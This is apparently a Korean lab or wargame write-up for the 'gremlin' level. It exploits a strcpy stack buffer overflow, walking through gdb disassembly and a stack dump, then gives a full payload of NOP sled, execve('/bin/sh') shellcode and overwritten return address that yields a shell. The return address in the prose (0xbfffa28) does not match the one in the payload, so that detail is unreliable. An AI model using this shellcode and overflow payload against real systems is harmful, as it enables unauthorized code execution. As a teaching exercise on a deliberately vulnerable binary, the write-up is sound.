# gate -> gremlin

gremlin.c 코드는 아래와 같다

``` C
int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

strcpy에서 bof가 일어날 수 있다. 256byte 이상 입력을 받아도 strcpy는 입력 길이 제한이 없기 때문에
256byte이상 입력값을 주고 return address를 조작하면 shell을 획득할 수 있다.

```
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,0x100
0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1
0x804843d <main+13>:    jg     0x8048456 <main+38>
0x804843f <main+15>:    push   0x80484e0
0x8048444 <main+20>:    call   0x8048350 <printf>
0x8048449 <main+25>:    add    %esp,4
0x804844c <main+28>:    push   0
0x804844e <main+30>:    call   0x8048360 <exit>
0x8048453 <main+35>:    add    %esp,4
0x8048456 <main+38>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048459 <main+41>:    add    %eax,4
0x804845c <main+44>:    mov    %edx,DWORD PTR [%eax]
0x804845e <main+46>:    push   %edx
0x804845f <main+47>:    lea    %eax,[%ebp-256]
0x8048465 <main+53>:    push   %eax
0x8048466 <main+54>:    call   0x8048370 <strcpy>
0x804846b <main+59>:    add    %esp,8
0x804846e <main+62>:    lea    %eax,[%ebp-256]
0x8048474 <main+68>:    push   %eax
0x8048475 <main+69>:    push   0x80484ec
---Type <return> to continue, or q <return> to quit---
0x804847a <main+74>:    call   0x8048350 <printf>
0x804847f <main+79>:    add    %esp,8
0x8048482 <main+82>:    leave
0x8048483 <main+83>:    ret
0x8048484 <main+84>:    nop
0x8048485 <main+85>:    nop
0x8048486 <main+86>:    nop
0x8048487 <main+87>:    nop
0x8048488 <main+88>:    nop
0x8048489 <main+89>:    nop
0x804848a <main+90>:    nop
0x804848b <main+91>:    nop
0x804848c <main+92>:    nop
0x804848d <main+93>:    nop
0x804848e <main+94>:    nop
0x804848f <main+95>:    nop
End of assembler dump.
```
strcpy 함수가 끝난 후인 main+62에 breakpoint를 걸어 esp를 확인해 보았다.
```
(gdb) b*main+62
Breakpoint 1 at 0x804846e
(gdb) r `python -c 'print "A"*256'`
Starting program: /home/gate/gremlin1 `python -c 'print "A"*256'`

Breakpoint 1, 0x804846e in main ()
(gdb) x/100x $esp
0xbffff928:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff938:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff948:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff958:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff968:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff978:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff988:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff998:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa08:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa18:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa28:     0xbffffa00      0x400309cb      0x00000002      0xbffffa74
0xbffffa38:     0xbffffa80      0x40013868      0x00000002      0x08048380
0xbffffa48:     0x00000000      0x080483a1      0x08048430      0x00000002
0xbffffa58:     0xbffffa74      0x080482e0      0x080484bc      0x4000ae60
0xbffffa68:     0xbffffa6c      0x40013e90      0x00000002      0xbffffb71
0xbffffa78:     0xbffffb85      0x00000000      0xbffffc86      0xbffffc95
0xbffffa88:     0xbffffcad      0xbffffccc      0xbffffcee      0xbffffcf8
---Type <return> to continue, or q <return> to quit---
0xbffffa98:     0xbffffebb      0xbffffeda      0xbffffef4      0xbfffff09
0xbffffaa8:     0xbfffff25      0xbfffff30      0xbfffff3d      0xbfffff45
```
return address를 0xbfffa28로 만들어주면 된다.

payload를 NOP * 200 + SHELLCODE(24byte) + NOP  * 36 + return address로 하면 된다.

```
./gremlin `python -c 'print "\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*36+"\x28\xf9\xff\xbf"'`
```

```
bash$ my-pass
euid = 501
hello bof world
```
이를 통해 쉘 획득 및 다음 단계 비밀번호를 얻었다!!
